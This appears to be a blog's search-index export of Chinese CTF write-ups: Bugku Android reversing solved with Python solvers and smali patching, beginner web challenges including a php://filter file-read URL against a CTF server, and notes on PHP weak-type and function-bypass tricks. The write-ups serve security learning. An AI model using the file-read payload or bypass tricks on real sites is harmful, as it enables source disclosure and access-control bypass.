<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bugku安卓逆向</title>
    <url>/2019/06/24/My_first_andriod_reverse/</url>
    <content><![CDATA[<p>前几天刚接触安卓逆向，做了几道安卓逆向题，bugku的几道入门题，惊为天人，这Java代码如此清晰明了，不像ida的C语言伪代码让人看得头都爆炸，虽说简单而且很多人都做过，也记录一下入坑过程。</p>
<h2 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h2><p>安装打开是一个倒计时，提示200000秒后出现flag<br>查看Java代码(可以用不同的工具，我用的Jeb2和Androidkiller，jeb2中按Q可以转化smali代码和Java代码，Androidkiller也有工具可以查看Java代码)，<code>beg</code>是开始时间+200000s，也就是出现flag的时间，<code>now</code>是现在实时时间 </p>
<p><img src="https://s2.ax1x.com/2019/06/26/ZmYmb8.png"></p>
<p>关键代码:一个判断，判断<code>beg</code>和<code>now</code>时间差小于0则输出答案，还有个关键变量<code>k</code>，初始值为0</p>
<p>可以直接修改判断条件绕过判断，剩下的问题就在于关键变量<code>k</code>的值了，代码意思是对从200000遍历到1的所有值用<code>is2</code>函数判断，再根据判断结果改变<code>k</code>的值，我们跟进<code>is2</code>函数：</p>
<p><img src="https://s2.ax1x.com/2019/06/26/ZmYuVS.png"></p>
<p>照样写脚本，跑出k的值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is1</span>(<span class="params">x</span>):</span></span><br><span class="line">    r = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span>(x % <span class="number">2</span> != <span class="number">0</span> <span class="keyword">and</span> x % <span class="number">3</span> != <span class="number">0</span>):</span><br><span class="line">            p = <span class="number">5</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> p*p &lt;= x:</span><br><span class="line">                    <span class="keyword">if</span>(x % p != <span class="number">0</span> <span class="keyword">and</span> x % (p+<span class="number">2</span>) != <span class="number">0</span>):</span><br><span class="line">                        p += <span class="number">6</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> r</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        r = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> x &lt;= <span class="number">1</span>:</span><br><span class="line">        r = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> is1(i):</span><br><span class="line">        k += <span class="number">100</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k -= <span class="number">1</span></span><br><span class="line">print(k)</span><br><span class="line"></span><br><span class="line"><span class="comment">#k=1616384</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>jeb2中在java代码中找到判断点按Q找到对应的smali代码位置，修改smali源码（可以用AndroidKiller或者apktool等），可以将<code>gtz</code>(大于等于)换成<code>ltz</code>（小于等于），也可以用其他操作，逻辑上能跳过等待都行。  </p>
<p><img src="https://s2.ax1x.com/2019/06/26/ZmYKUg.png"></p>
<p>然后还要解决k值的问题，从下面<code>iget</code>（取值，用于操作int这种的值类型）语句可以看出v3是k的值，在这句后面加上<code>const v3,1616384</code>（赋值给v3）然后编译，签名（AndroidKiller可以签名），再安装就会直接出现flag了，记得换flag格式。</p>
<h2 id="LoopAndLoop"><a href="#LoopAndLoop" class="headerlink" title="LoopAndLoop"></a>LoopAndLoop</h2><p>安装打开让你输入密码得到flag，直接查看Java代码，找到输出flag的位置：</p>
<p><img src="https://s2.ax1x.com/2019/06/27/ZmBIDs.png"></p>
<p>跟进判断函数(check)：</p>
<p>发现一个原生（native）函数：Java中使用其他语言编写的函数<br>现在一些app，为了安全或者效率问题，会把一些重要的功能放到native层，Android中一般native层使用的是so库文件<br>然后apktool反编译后用IDA调试<code>liblhm.so</code>文件，找到<code>chec</code>函数：</p>
<p><img src="https://s2.ax1x.com/2019/06/27/ZmB5uj.png"></p>
<p>意思大概是传入两个参数<code>v1</code>和<code>v2</code>，再根据<code>2*v2%3</code>的值确定调用check1，2，3中的一个函数，以<code>v1</code>和<code>v2-1</code>作为参数，最后<code>v2&lt;=1</code>则返回<code>v1</code><br>check1，2，3在Java代码里，都比较简单：</p>
<p><img src="https://s2.ax1x.com/2019/06/27/ZmBLCT.png"></p>
<p><img src="https://s2.ax1x.com/2019/06/27/ZmBb5V.png"></p>
<p><img src="https://s2.ax1x.com/2019/06/27/ZmBO8U.png"></p>
<p>我们观察代码并照样写逆向脚本，原来<code>v1</code>是从输入的值到1835996258，<code>v2</code>从99到2，逆向脚本<code>v2</code>就从2到99，<code>v1</code>从1835996258到需要我们输入的正确密码，3个check函数里面的加减给变一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(b&gt;<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">2</span>*b%<span class="number">3</span>==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> fun1(a,b+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span>(<span class="number">2</span>*b%<span class="number">3</span>==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> fun2(a,b+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> fun3(a,b+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        a-=i</span><br><span class="line">    <span class="keyword">return</span> fun(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(b%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">            a-=i</span><br><span class="line">        <span class="keyword">return</span> fun(a,b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">            a+=i</span><br><span class="line">        <span class="keyword">return</span> fun(a,b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun3</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        a-=i</span><br><span class="line">    <span class="keyword">return</span> fun(a,b)</span><br><span class="line"></span><br><span class="line">print(fun(<span class="number">1835996258</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#算出密码为236492408</span></span><br></pre></td></tr></table></figure>
<p>再打开app输入密码就能得到flag了</p>
<h2 id="easy-100"><a href="#easy-100" class="headerlink" title="easy-100"></a>easy-100</h2><p>安装打开还是常见的让你输入key，jeb查看Java代码，加上main一共有6个函数，看类名估计都有用：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJIKAg.png"></p>
<p>先看<code>MainActivity</code>，<code>onCreate</code>方法，执行了<code>p</code>方法，之后对<code>class d</code>创建了一个按钮监听事件，<code>p</code>方法是把<code>url.png</code>以二进制方式打开，从144的位置开始读取16字符赋值给<code>v</code>，apktool反编译后Winhex查看可以确定<code>v</code>值为<code>this_is_the_key.</code>：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJI4Cd.png"><br><img src="https://s2.ax1x.com/2019/07/02/ZJTOpj.png"></p>
<p>跟进<code>class d</code>分析，发现调用了<code>MainActivity.a()</code>函数对输入进行校检：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJTkOP.png"></p>
<p>再回去看<code>MainActivity.a()</code>,发现有重载，一个参数，两个参数，三个参数的<code>MainActivity.a()</code>函数，<code>d</code>中外层调用了三个参数的<code>MainActivity.a()</code>函数，<code>MainActivity</code>作为第一个参数，一个参数的<code>MainActivity.a()</code>函数作为第二个参数，输入的字符串作为第三个参数，三个参数的<code>MainActivity.a()</code>函数返回的是两个参数的<code>MainActivity.a()</code>函数，一层层分析其实最后就是<code>a(&quot;this_is_the_key.&quot;,输入的字符串)</code>：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJTtkF.png"></p>
<p>两个参数的<code>MainActivity.a()</code>函数返回<code>class c.a()</code>函数，再跟进，又有重载………先调用一参数的<code>class c.a()</code>将<code>&quot;this_is_the_key.&quot;</code>每两个字符交换位置得到<code>&quot;htsii__sht_eek.y&quot;</code>，然后将这个和输入的字符串传到<code>class a</code>的函数去：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJ7vPe.png"></p>
<p>跟进<code>class a</code>，是一个AES加密，ECB模式，PKCS5Padding填充，<code>&quot;htsii__sht_eek.y&quot;</code>作为密钥，加密后返回与两个参数的<code>MainActivity.a()</code>中的一长串相等就ok了，网上找在线解密就行，我试了好几个网站才搞定。</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJH1aT.png"></p>
<p>网友写的解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line">data = [<span class="number">0x15</span>, <span class="number">0xa3</span>, <span class="number">0xbc</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0x75</span>, <span class="number">0xed</span>, <span class="number">0xbc</span>, </span><br><span class="line">        <span class="number">0xa4</span>, <span class="number">0x21</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x10</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xf1</span>, </span><br><span class="line">        <span class="number">0xf3</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x67</span>, <span class="number">0xee</span>, <span class="number">0x51</span>, <span class="number">0x1e</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x36</span>, <span class="number">0xa3</span>, <span class="number">0x2c</span>, <span class="number">0xe9</span>, <span class="number">0x5d</span>, <span class="number">0x62</span>, <span class="number">0x05</span>, <span class="number">0x3b</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;url.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()[<span class="number">144</span>:<span class="number">144</span>+<span class="number">16</span>]</span><br><span class="line"> </span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(content), <span class="number">2</span>):</span><br><span class="line">    key += content[i + <span class="number">1</span>]</span><br><span class="line">    key += content[i]</span><br><span class="line"> </span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    text = aes.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> decrypt(data, key)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SafeBox"><a href="#SafeBox" class="headerlink" title="SafeBox"></a>SafeBox</h2><p>安装打开，还是输入key…..，没有提交按钮，但是不影响，还是先看Java代码，<code>MainActivity</code>函数：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZJxMU1.png"></p>
<p>照样写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">v6=<span class="string">&quot;NJCTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> v4 <span class="keyword">in</span> range(<span class="number">10000001</span>,<span class="number">99999999</span>):</span><br><span class="line">    v7=<span class="number">1</span></span><br><span class="line">    v8=<span class="number">10000000</span></span><br><span class="line">    v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(abs(math.floor(v4/<span class="number">1000</span>)%<span class="number">100</span><span class="number">-36</span>)==<span class="number">3</span> <span class="keyword">and</span> v4%<span class="number">1000</span>%<span class="number">584</span>==<span class="number">0</span>):</span><br><span class="line">        v5=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(v5&lt;<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span>(math.floor(v4/v7)%<span class="number">10</span>!=math.floor(v4/v8)%<span class="number">10</span>):</span><br><span class="line">                v3=<span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v7*=<span class="number">10</span></span><br><span class="line">                v8/=<span class="number">10</span></span><br><span class="line">                v5+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(v3==<span class="number">1</span>):</span><br><span class="line">            print(v4)</span><br><span class="line">            print(v6+chr(math.floor(v4/<span class="number">1000000</span>))+chr(math.floor(v4/<span class="number">10000</span>)%<span class="number">100</span>)+chr(math.floor(v4/<span class="number">100</span>)%<span class="number">100</span>)+<span class="string">&quot;f4n&#125;&quot;</span>)</span><br><span class="line"><span class="comment">#48533584</span></span><br><span class="line"><span class="comment">#NJCTF&#123;05#f4n&#125;</span></span><br></pre></td></tr></table></figure>
<p>题上有提示flag只含大小写字母和数字，这个答案是错的，交上去也过不了，再找找发现<code>androidTest</code>类里面和<code>MainActivity</code>很像，只有一些细节不同：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYAnSA.png"></p>
<p>改脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">v6=<span class="string">&quot;NJCTF&#123;have&quot;</span></span><br><span class="line"><span class="keyword">for</span> v4 <span class="keyword">in</span> range(<span class="number">10000001</span>,<span class="number">99999999</span>):</span><br><span class="line">    v7=<span class="number">1</span></span><br><span class="line">    v8=<span class="number">10000000</span></span><br><span class="line">    v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(abs(math.floor(v4/<span class="number">1000</span>)%<span class="number">100</span><span class="number">-36</span>)==<span class="number">3</span> <span class="keyword">and</span> v4%<span class="number">1000</span>%<span class="number">584</span>==<span class="number">0</span>):</span><br><span class="line">        v5=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(v5&lt;<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span>(math.floor(v4/v7)%<span class="number">10</span>!=math.floor(v4/v8)%<span class="number">10</span>):</span><br><span class="line">                v3=<span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v7*=<span class="number">10</span></span><br><span class="line">                v8/=<span class="number">10</span></span><br><span class="line">                v5+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(v3==<span class="number">1</span>):</span><br><span class="line">            print(v4)</span><br><span class="line">            print(v6+chr(math.floor(v4/<span class="number">1000000</span>))+chr(math.floor(v4/<span class="number">10000</span>)%<span class="number">100</span>)+chr(math.floor(v4/<span class="number">100</span>)%<span class="number">100</span>+<span class="number">10</span>)+<span class="string">&quot;f4n&#125;&quot;</span>)</span><br><span class="line"><span class="comment">#48533584</span></span><br><span class="line"><span class="comment">#NJCTF&#123;have05-f4n&#125;</span></span><br><span class="line"><span class="comment">#48539584</span></span><br><span class="line"><span class="comment">#NJCTF&#123;have05if4n&#125;</span></span><br></pre></td></tr></table></figure>
<p>第二个flag满足提示的条件，交上去A了。</p>
<h2 id="easyeasy-200"><a href="#easyeasy-200" class="headerlink" title="easyeasy-200"></a>easyeasy-200</h2><p><code>MainAcivity</code>中接收输入的字符串，先判断长度，然后用<code>Format.form()</code>函数截取，之后用<code>Check.check()</code>判断，然后调用到了native层的<code>checkEmulator</code>和<code>checkPasswd</code>函数,<code>checkPipes</code>函数检查路径是否存在，查看后知道恒返回假，最后关键就在<code>checkPasswd</code>里：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYVYMn.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYVdaT.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYZdOI.png"></p>
<p>apktool反编译后ida调试so文件，找到<code>checkPasswd</code>,先对传入的字符串进行了反转:</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYZ7hF.png"></p>
<p>然后有一个加密，比较复杂，我看不懂，尝试在字符串里找密文，发现可疑字符串：</p>
<p><img src="https://s2.ax1x.com/2019/07/02/ZYZLc9.png"></p>
<p>下面的明显是base64，上面的也像，把最后的”.”换成”=”解码在反转得到flag.</p>
<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>签到题，看Java代码，很明显就是把输入的字符串反转再base64解码后与id<code>2131427360(0x7f0b0020)</code>处密文比较：</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYRrQK.png"></p>
<p>Androidkiler逐步搜索直接就能找到密文.</p>
<h2 id="mobile1"><a href="#mobile1" class="headerlink" title="mobile1"></a>mobile1</h2><p>看Java代码，用<code>checkSN()</code>函数校检<code>&quot;Tenshine&quot;</code>和输入的字符串：</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZteLfU.png"></p>
<p>看<code>checkSN()</code>函数，先判断字符串长度，后对<code>&quot;Tenshine&quot;</code>进行md5加密并转化成十六进制再截取奇数位(下标从0开始)，拼上flag格式与输入的flag比较(忽略大小写)：</p>
<p><img src="https://s2.ax1x.com/2019/07/03/Ztu2Y6.png"></p>
<p>分析完后用网上的在线工具就能解题。</p>
<h2 id="mobile2"><a href="#mobile2" class="headerlink" title="mobile2"></a>mobile2</h2><p>解压后是一个文件夹，不是apk，也不能编译生成apk，其实是一道杂项题，flag在<code>AndroidManifest.xml</code>里:</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZtGYGR.png"></p>
<h2 id="First-Mobile-xman"><a href="#First-Mobile-xman" class="headerlink" title="First_Mobile(xman)"></a>First_Mobile(xman)</h2><p>主函数：监听，把输入的字符串传给<code>encode.check()</code>校检</p>
<p><img src="https://s2.ax1x.com/2019/07/04/ZNBS56.png"></p>
<p>跟进观察，算法很清晰明了：将函数里的字符串经过简单加密后与输入的字符串比较</p>
<p><img src="https://s2.ax1x.com/2019/07/04/ZNBZVI.png"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">23</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">32</span>, <span class="number">32</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span>(((arr[i]+j)%<span class="number">61</span>)*<span class="number">2</span>-i==j):</span><br><span class="line">            print(chr(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#LOHILMNMLKHILKHI</span></span><br></pre></td></tr></table></figure>

<p>跑出来答案怎么交都不对，flag其实是<code>XMAN&#123;LOHILMNMLKHILKHI&#125;</code>…..</p>
<h2 id="HelloSmali2"><a href="#HelloSmali2" class="headerlink" title="HelloSmali2"></a>HelloSmali2</h2><p>这道题更像是教学性质的题吧，给你一个smali代码和一个Java代码，相互翻译其实是一样的，要过题的话直接跑Java代码就行了，我放个smali文件链接感兴趣的同学可以试着读一下：smali代码反正我是读不懂……………………</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>初入Web做的水题</title>
    <url>/2019/05/01/Begining_of_Web/</url>
    <content><![CDATA[<p>入坑较晚，水平也较低，就以各大平台我所能做的Web签到题谈谈我粗浅的理解，如有错误还请师傅们指点。</p>
<h4 id="南邮ctfWeb第二题"><a href="#南邮ctfWeb第二题" class="headerlink" title="南邮ctfWeb第二题"></a>南邮ctfWeb第二题</h4><p><img src="https://s2.ax1x.com/2019/09/11/na5SCF.png"></p>
<p>md5是一种密码散列函数，是多对一的函数，理论上是不能解密的，但因为是多对一的关系，就存在不同数据的md5相同的情况，称为md5碰撞，不过这里我们不用去找与所给字符串md5相同的其他字符串，因为这串字符串md5加密后是以”0e”开头的字符串，而php是弱类型语言，其变量在比较的时候会自动转化数据类型，”0e”开头就会以科学计数法的方式被识别成数字0，所以这里我们只需要输入md5加密后是”0e”开头的字符串就行了，这是老套路，百度一查一大堆.</p>
<h4 id="南邮ctfWeb第三题"><a href="#南邮ctfWeb第三题" class="headerlink" title="南邮ctfWeb第三题"></a>南邮ctfWeb第三题</h4><p><img src="https://s2.ax1x.com/2019/09/11/na5p34.png"></p>
<p>写得很明白输入”zhimakaimen”，可是却返回口令错误，细心一点会发现最后一个字符没输进去，在网页源码中能看到”maxlength=10”限制了输入字符的长度，可以直接把”10”改成”11”再回去输就可以输11位了。网页其实就是对方服务器返回给请求者的html文件然后在本地浏览器上运行就产生了我们看到的界面，既然是在本地运行我们就可以对它进行修改嘛。另外在网页上”记住密码”之后，下次进入网页密码会自动填上，只是用一串小黑点隐藏起来，如果忘了密码也可以改网页源码来查看密码。</p>
<p>这道题还可以用post直接把值传给text1，也可以得到flag。</p>
<h4 id="Bugku-flag在index里"><a href="#Bugku-flag在index里" class="headerlink" title="Bugku flag在index里"></a>Bugku flag在index里</h4><p><img src="https://s2.ax1x.com/2019/09/11/na5Cv9.png"></p>
<p>直接明了地说了flag在index里，这里需要用到php伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8005&#x2F;post&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>可以得到index.php的base64编码，解码可查看内容:</p>
<p><img src="https://s2.ax1x.com/2019/09/11/na5iuR.png"></p>
<p>“php://filter/“是一种可以访问本地文件并筛选数据流的协议，”read=convert.base64-encode”是将数据用base64编码后读取，就是一种筛选</p>
<p>$file是get传入的参数，strstr()是检查字符串中是否含有指定字串，此处过滤了一些php://的其他协议。”include”是将外部的php文件引进并执行，如果执行失败的话会返回源码，而这里flag是写在源码的注释中的，所以如果不编码直接读取的话源码会执行，不能看到flag.</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>关于简单的php函数漏洞和绕过</title>
    <url>/2019/05/02/simple_php_bugs/</url>
    <content><![CDATA[<p>先贴三张php官方类型比较的图</p>
<p><img src="https://s2.ax1x.com/2019/09/11/na4Hjs.png"></p>
<p><img src="https://s2.ax1x.com/2019/09/11/na4qun.png"></p>
<p><img src="https://s2.ax1x.com/2019/09/11/na4OH0.png"></p>
<p>php是一种弱类型语言，颇具灵活性，但也因此存在一些绕过的奇技淫巧，一些基础ctf题里也有php代码审计这一类，下面记录一些简单php函数绕过点，如有错误还请指点。</p>
<h5 id="extrac"><a href="#extrac" class="headerlink" title="extrac():"></a>extrac():</h5><p>可传入一个带键值的数组，分别把键值赋值给对应键名的变量，若变量存在则会覆盖原值，可以用这个特性改变已存在变量的值。</p>
<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents():"></a>file_get_contents():</h5><p>传入一个文件名，将文件内容读取至一个字符串中，但是如果找不到该文件的话它会返回FALSE。</p>
<h5 id="strcmp-v1-v2"><a href="#strcmp-v1-v2" class="headerlink" title="strcmp($v1,$v2):"></a>strcmp($v1,$v2):</h5><p>比较两个值，若$v1&lt;$v2返回&lt;0,若$v&gt;$v2返回&gt;0，若相等返回0，但是这个函数不能处理数组，而且遇到数组报错之后会返回NULL。</p>
<h5 id="md5"><a href="#md5" class="headerlink" title="md5():"></a>md5():</h5><p>md5函数存在碰撞问题，即多个明文加密后密文相同，php的0e开头字符串会被判定成科学计数法的数字也常常和md5联系在一起，还有md5函数不能处理数组，遇到数组也会返回NULL，另外sha1()函数处理数组也会返回NULL。</p>
<h5 id="strpos-str1-str2-："><a href="#strpos-str1-str2-：" class="headerlink" title="strpos($str1,$str2)："></a>strpos($str1,$str2)：</h5><p>查找$str2在$str1中第一次出现的位置（0开始），若没有出现则返回FALSE，若是$str1为数组则会返回NULL，$str2为数组会返回FALSE。</p>
<p>另外还有类似函数:</p>
<p>stripos(): 查找首次出现的位置，不区分大小写；strrpos(): 查找最后一次出现的位置，区分大小写；strripos(): 查找最后一次出现的位置，不区分大小写。</p>
<h5 id="大于小于等于符号判断大小"><a href="#大于小于等于符号判断大小" class="headerlink" title="大于小于等于符号判断大小:"></a>大于小于等于符号判断大小:</h5><p>php中 如果判断大小时遇到数组，优先认为数组较大，然后才是数字和字符串，在数组间的比较中先判断数组的大小（数组中有多少数），若大小相同再依次从前往后判断数的大小，相等则继续判断下一位，不相等则返回结果。字符串与数字比较时若字符串全由数字组成则转化成数字比较，否则转化成字符串比较。</p>
<h5 id="ereg"><a href="#ereg" class="headerlink" title="ereg():"></a>ereg():</h5><p>php中ereg()函数时用来在字符串中查找是否含有指定字串，含有则返回TRUE否则返回FALSE，大小写敏感。</p>
<p>它处理数组会返回NULL，字符串中遇到%00会认为字符串结束，不再匹配后面的字符。这个函数在php5以后就已经被舍弃了。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>假期集训逆向</title>
    <url>/2019/07/19/Holiday-Re-practice/</url>
    <content><![CDATA[<p>假期留校集训，关在实验室自生自灭，做了几道简单的逆向题，各大平台的都有。</p>
<h1 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h1><h2 id="whatamitoyou"><a href="#whatamitoyou" class="headerlink" title="whatamitoyou"></a>whatamitoyou</h2><p>给了提示“你会唱歌吗？”，ELF文件，先用IDA静态分析，main函数开始先进行了很长很长的声明很多变量，变量赋值，再把变量的地址赋值给另个变量，赋值的部分把int值按R转化成字符串会发现是倒序的一些英文句子，倒序是因为数字转化成字符串存在内存中的小端存储问题，在x86结构的内存中数字是高位存在低地址，把转化成字符串就会调转顺序：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zjj5W9.png"></p>
<p>根据提示猜测这些句子可能是歌词，于是Google搜到了这首歌：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZjvjBV.png"></p>
<p>发现题中的歌词是乱序的，猜测解题和顺序有关。<br>“准备工作”结束后进行了一系列看不大懂的运算：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zv9jFf.png"></p>
<p>Linux下edb动态调试，开始的声明，赋值直接跳过后在漫长的“准备工作”最后，结合ida可以发现把第一句歌词的地址赋给了[rbp-8]:</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zv95WD.png"></p>
<p>这里开始操作输入的字符串,把字符放入[rbp-0x11]：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvF17n.png"> </p>
<p>跟进跳转到这里用字符对歌词地址进行操作<code>“旧地址+(字符-0x41+0x20)*8=新地址”</code>：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvVOGq.png"></p>
<p>结合IDA找到第二句歌词<code>&quot;I should have just told you&quot;</code>的地址，有两个，都进行逆运算得出输入的第一个字符应该是<code>67=&#39;C&#39;</code>：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvQKj1.png"></p>
<p>一直重复就能找出全部字符串，其实也有规律，在栈里存每一段歌词的地址下面不远处有连续四个地方存的是其他歌词的地址，字符ABCD运算下来分别就对应着这四句歌词的位置，这样很快就能得出输入的字符串：<code>CBDABCADBCCABBABBABACBCCABDADBABABB</code>。</p>
<h2 id="逆向观察"><a href="#逆向观察" class="headerlink" title="逆向观察"></a>逆向观察</h2><p>ELF文件，IDA查看：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvBvqO.png"></p>
<p>把<code>src</code>拷贝给<code>dest</code>,然后遍历<code>dict</code>里的字符串，如果有字符串同时与<code>dest</code>和输入的字符串相等则输入正确，很简单，只有一个小端问题，上一题有介绍。</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>给的是一个网址，当时很懵逼，这TM不是逆向么…查看网页源码可以看见一段JS代码：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zvy7m6.png"></p>
